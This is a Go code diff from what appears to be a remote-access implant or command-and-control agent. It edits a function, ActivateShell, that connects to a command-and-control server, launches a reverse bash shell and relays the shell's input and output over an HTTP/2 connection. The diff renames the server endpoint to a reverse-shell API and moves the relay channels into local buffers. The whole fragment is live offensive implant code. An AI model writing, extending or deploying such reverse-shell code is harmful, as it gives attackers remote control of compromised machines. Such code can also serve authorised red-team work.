@@ -17,16 +17,21 @@ import (
 func ActivateShell() {
 	var (
 		err       error
-		streamURL = CCAddress + tun.StreamAPI
+		rshellURL = CCAddress + tun.ReverseShellAPI
+		shellPID  = 0 // PID of the bash shell
 
-		conn     *h2conn.Conn // reverse shell uses this connection
-		ctx      context.Context
-		cancel   context.CancelFunc
-		shellPID = 0 // PID of the bash shell
+		// buffer for reverse shell
+		sendcc = make(chan []byte)
+		recvcc = make(chan []byte)
+
+		// connection
+		conn   *h2conn.Conn // reverse shell uses this connection
+		ctx    context.Context
+		cancel context.CancelFunc
 	)
 
 	// connect CC
-	conn, ctx, cancel, err = ConnectCC(streamURL)
+	conn, ctx, cancel, err = ConnectCC(rshellURL)
 	log.Print("reverseBash started")
 
 	// clean up connection and bash
@@ -48,7 +53,7 @@ func ActivateShell() {
 	}
 	defer cleanup()
 
-	go reverseShell(ctx, cancel, SendCC, RecvCC, &shellPID)
+	go reverseShell(ctx, cancel, sendcc, recvcc, &shellPID)
 
 	go func() {
 		for {
@@ -67,12 +72,12 @@ func ActivateShell() {
 					cancel()
 					return
 				}
-				RecvCC <- data
+				recvcc <- data
 			}
 		}
 	}()
 
-	for outgoing := range SendCC {
+	for outgoing := range sendcc {
 		select {
 		case <-ctx.Done():
 			return
